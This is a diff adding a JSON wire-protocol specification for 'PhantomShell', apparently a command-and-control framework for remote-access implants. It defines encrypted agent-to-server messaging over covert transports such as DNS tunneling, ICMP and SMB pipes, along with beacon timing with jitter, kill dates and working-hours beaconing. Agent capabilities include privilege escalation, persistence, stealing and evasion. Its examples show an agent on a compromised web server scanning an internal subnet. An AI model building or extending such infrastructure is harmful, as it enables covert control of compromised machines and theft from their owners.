@@ -1,0 +1,233 @@
+{
+  "protocol": {
+    "name": "PhantomShell Protocol",
+    "version": "1.0",
+    "description": "Unified wire protocol for all PhantomShell agents",
+    "max_message_size": 10485760,
+    "keepalive_interval": 30,
+    "handshake_timeout": 10
+  },
+  "encryption": {
+    "algorithm": "AES-256-GCM",
+    "key_exchange": "ECDH-Curve25519",
+    "kdf": "HKDF-SHA256",
+    "wire_format": {
+      "description": "[4B length][12B nonce][ciphertext][16B GCM tag]",
+      "length_bytes": 4,
+      "length_endian": "big",
+      "nonce_bytes": 12,
+      "tag_bytes": 16
+    },
+    "key_exchange_flow": [
+      "1. Agent generates ephemeral Curve25519 keypair",
+      "2. Agent sends public key in register message",
+      "3. Server responds with its public key in ack",
+      "4. Both derive shared secret via ECDH",
+      "5. Derive AES key via HKDF-SHA256(shared_secret, salt=session_id, info='phantomshell')",
+      "6. All subsequent messages encrypted with derived key"
+    ]
+  },
+  "transports": {
+    "tcp": {"default_port": 4444, "description": "Raw TCP with length-prefix framing"},
+    "http": {"default_port": 8443, "description": "HTTPS POST/GET polling"},
+    "websocket": {"default_port": 443, "description": "WSS persistent connection"},
+    "dns": {"default_port": 53, "description": "DNS TXT/CNAME tunneling"},
+    "icmp": {"description": "ICMP echo request/reply data channel"},
+    "smb": {"default_port": 445, "description": "Named pipe over SMB"}
+  },
+  "envelope": {
+    "message_id": {"type": "string", "format": "uuid4", "required": true, "description": "Unique message identifier"},
+    "timestamp": {"type": "integer", "required": true, "description": "Unix epoch seconds"},
+    "sequence": {"type": "integer", "required": true, "description": "Monotonically increasing per session"},
+    "session_id": {"type": "string", "required": false, "description": "Assigned by server on registration"},
+    "agent_id": {"type": "string", "required": true, "description": "Unique agent identifier (generated on first run)"},
+    "type": {"type": "string", "enum": ["register", "beacon", "task", "response", "ack"], "required": true},
+    "payload": {"type": "object", "required": true}
+  },
+  "messages": {
+    "register": {
+      "type": "register",
+      "direction": "agent_to_server",
+      "description": "Agent registration on first connect",
+      "payload": {
+        "hostname": {"type": "string", "required": true},
+        "username": {"type": "string", "required": true},
+        "uid": {"type": "integer", "required": false},
+        "domain": {"type": "string", "required": false, "description": "AD domain if joined"},
+        "os": {"type": "string", "required": true, "enum": ["linux", "windows", "darwin", "freebsd"]},
+        "os_version": {"type": "string", "required": true},
+        "kernel": {"type": "string", "required": false},
+        "arch": {"type": "string", "required": true, "enum": ["x86", "x64", "arm", "arm64"]},
+        "agent_type": {"type": "string", "required": true, "enum": ["php", "python", "csharp", "cpp", "go", "powershell"]},
+        "agent_version": {"type": "string", "required": true},
+        "pid": {"type": "integer", "required": true},
+        "ppid": {"type": "integer", "required": false},
+        "process_name": {"type": "string", "required": false},
+        "integrity": {"type": "string", "required": true, "enum": ["low", "medium", "high", "system"]},
+        "is_admin": {"type": "boolean", "required": true},
+        "capabilities": {"type": "array", "items": "string", "required": true, "description": "List of supported command categories"},
+        "interfaces": {"type": "array", "items": {"ip": "string", "name": "string"}, "required": false},
+        "transport": {"type": "string", "required": true},
+        "public_key": {"type": "string", "required": false, "description": "Base64-encoded Curve25519 public key for ECDH"},
+        "sleep": {"type": "number", "required": true, "description": "Current beacon interval in seconds"},
+        "jitter": {"type": "number", "required": true, "description": "Jitter percentage (0-100)"}
+      }
+    },
+    "beacon": {
+      "type": "beacon",
+      "direction": "agent_to_server",
+      "description": "Periodic heartbeat with system metrics",
+      "payload": {
+        "uptime": {"type": "integer", "description": "Agent uptime in seconds"},
+        "idle": {"type": "boolean", "description": "True if no active tasks"},
+        "active_tasks": {"type": "integer", "description": "Number of running tasks"},
+        "cpu_percent": {"type": "number", "required": false},
+        "mem_percent": {"type": "number", "required": false},
+        "cwd": {"type": "string", "description": "Current working directory"},
+        "username": {"type": "string", "description": "Current user (may change after token manipulation)"},
+        "integrity": {"type": "string", "enum": ["low", "medium", "high", "system"]},
+        "pid": {"type": "integer"},
+        "ip_changed": {"type": "boolean", "required": false, "description": "True if network interfaces changed since last beacon"}
+      }
+    },
+    "task": {
+      "type": "task",
+      "direction": "server_to_agent",
+      "description": "Command for agent to execute",
+      "payload": {
+        "task_id": {"type": "string", "format": "uuid4", "required": true},
+        "command": {"type": "string", "required": true, "description": "Command name from commands.json registry"},
+        "args": {"type": "object", "required": false, "description": "Command arguments as key-value pairs"},
+        "raw": {"type": "string", "required": false, "description": "Raw command string (for shell passthrough)"},
+        "timeout": {"type": "integer", "required": false, "default": 30, "description": "Execution timeout in seconds"},
+        "background": {"type": "boolean", "required": false, "default": false},
+        "priority": {"type": "integer", "required": false, "default": 5, "description": "1 (highest) to 10 (lowest)"},
+        "chunk_size": {"type": "integer", "required": false, "description": "Max response chunk size in bytes for large outputs"},
+        "module": {"type": "string", "required": false, "description": "Module to load if not already loaded"}
+      }
+    },
+    "response": {
+      "type": "response",
+      "direction": "agent_to_server",
+      "description": "Command execution result",
+      "payload": {
+        "task_id": {"type": "string", "format": "uuid4", "required": true, "description": "Matches the task that produced this response"},
+        "status": {"type": "string", "required": true, "enum": ["success", "error", "partial", "running"]},
+        "error_code": {"type": "integer", "required": false, "description": "Error code from error_codes table"},
+        "output": {"type": "string", "required": false, "description": "Text output (stdout)"},
+        "error": {"type": "string", "required": false, "description": "Error output (stderr)"},
+        "data": {"type": "object", "required": false, "description": "Structured data (for modules that return JSON)"},
+        "data_b64": {"type": "string", "required": false, "description": "Base64-encoded binary data (file downloads, screenshots)"},
+        "chunk_index": {"type": "integer", "required": false, "description": "Chunk number for chunked responses"},
+        "chunk_total": {"type": "integer", "required": false, "description": "Total chunks expected"},
+        "exec_time_ms": {"type": "integer", "required": false, "description": "Execution time in milliseconds"},
+        "exit_code": {"type": "integer", "required": false}
+      }
+    },
+    "ack": {
+      "type": "ack",
+      "direction": "server_to_agent",
+      "description": "Server acknowledgment (sent after register or config change)",
+      "payload": {
+        "session_id": {"type": "string", "required": true, "description": "Assigned session identifier"},
+        "status": {"type": "string", "required": true, "enum": ["accepted", "rejected", "reconfigure"]},
+        "public_key": {"type": "string", "required": false, "description": "Server's Curve25519 public key for ECDH"},
+        "sleep": {"type": "number", "required": false, "description": "Override agent sleep interval"},
+        "jitter": {"type": "number", "required": false, "description": "Override agent jitter percentage"},
+        "kill_date": {"type": "string", "format": "ISO-8601", "required": false, "description": "Agent self-destruct date"},
+        "working_hours": {"type": "string", "required": false, "description": "Only beacon during these hours (e.g. '09:00-17:00')"},
+        "transport_config": {"type": "object", "required": false, "description": "Transport-specific overrides"},
+        "message": {"type": "string", "required": false}
+      }
+    }
+  },
+  "error_codes": {
+    "0": "success",
+    "1": "unknown_command",
+    "2": "invalid_args",
+    "3": "permission_denied",
+    "4": "timeout",
+    "5": "execution_failed",
+    "6": "module_not_loaded",
+    "7": "transport_error",
+    "8": "encryption_error",
+    "9": "file_not_found",
+    "10": "connection_refused",
+    "11": "authentication_failed",
+    "12": "session_expired",
+    "13": "rate_limited",
+    "14": "payload_too_large",
+    "15": "unsupported_operation",
+    "16": "agent_busy",
+    "17": "kill_date_reached",
+    "18": "checksum_mismatch",
+    "19": "protocol_version_mismatch",
+    "99": "internal_error"
+  },
+  "examples": {
+    "register": {
+      "message_id": "a1b2c3d4-e5f6-7890-abcd-ef1234567890",
+      "timestamp": 1719792000,
+      "sequence": 0,
+      "agent_id": "ps-f47ac10b-58cc",
+      "type": "register",
+      "payload": {
+        "hostname": "web01",
+        "username": "www-data",
+        "uid": 33,
+        "os": "linux",
+        "os_version": "Ubuntu 22.04.3 LTS",
+        "kernel": "5.15.0-91-generic",
+        "arch": "x64",
+        "agent_type": "python",
+        "agent_version": "5.0",
+        "pid": 1337,
+        "ppid": 1,
+        "integrity": "low",
+        "is_admin": false,
+        "capabilities": ["shell", "files", "recon", "network", "privesc", "persist", "stealing", "evasion"],
+        "transport": "tcp",
+        "public_key": "MCowBQYDK2VuAyEA...",
+        "sleep": 5,
+        "jitter": 20
+      }
+    },
+    "task": {
+      "message_id": "b2c3d4e5-f6a7-8901-bcde-f12345678901",
+      "timestamp": 1719792005,
+      "sequence": 1,
+      "session_id": "sess-abc123",
+      "agent_id": "ps-f47ac10b-58cc",
+      "type": "task",
+      "payload": {
+        "task_id": "task-001",
+        "command": "portscan",
+        "args": {"target": "10.10.10.0/24", "ports": "22,80,443,445,3389", "threads": 10},
+        "timeout": 120,
+        "background": true
+      }
+    },
+    "response": {
+      "message_id": "c3d4e5f6-a7b8-9012-cdef-123456789012",
+      "timestamp": 1719792125,
+      "sequence": 5,
+      "session_id": "sess-abc123",
+      "agent_id": "ps-f47ac10b-58cc",
+      "type": "response",
+      "payload": {
+        "task_id": "task-001",
+        "status": "success",
+        "data": {
+          "hosts_scanned": 254,
+          "hosts_up": 12,
+          "open_ports": [
+            {"host": "10.10.10.1", "port": 22, "banner": "SSH-2.0-OpenSSH_8.9p1"},
+            {"host": "10.10.10.5", "port": 80, "banner": "Apache/2.4.52"},
+            {"host": "10.10.10.10", "port": 445, "banner": "Windows Server 2019"}
+          ]
+        },
+        "exec_time_ms": 45200
+      }
+    }
+  }
+}
